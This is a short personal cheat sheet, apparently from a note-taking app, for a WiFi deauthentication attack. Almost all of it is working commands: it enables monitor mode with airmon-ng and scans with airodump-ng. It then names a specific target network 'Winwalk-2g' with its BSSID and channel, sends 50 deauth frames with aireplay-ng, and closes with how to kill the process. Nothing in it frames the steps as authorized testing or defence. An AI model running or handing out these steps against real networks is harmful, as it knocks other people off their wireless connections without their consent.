## **Wifi Deauthentication**

```
sudo lsusb
```
                                                     
```
sudo apt install realtek-rtl8814au-dkms
```

```
ip addr
```

```
cat /etc/os-release
```

```
sudo airmon-ng check kill
```

Now we will change it to monitor mode

```
sudo airmon-ng start wlan0
```

![[Pasted image 20260330221454.png]]

```
sudo airodump-ng wlan0
```

![[Pasted image 20260330221501.png]]

Here we will attack in Winwalk-2g and channel is BSSID

BSSID: A8:3A:48:37:54:00

Channel: 10

```
sudo iwconfig wlan0 channel <channel>  
```

```
sudo airodump-ng -c <channel> --bssid <bssid> wlan0 (should be running)
```

```
sudo aireplay-ng --deauth 50 -a <bssid> wlan0
```


**TO STOP THIS ATTACK (FOR LINUX)**

```
ps aux | grep aireplay-ng
```

```
kill -9 <PID>
```
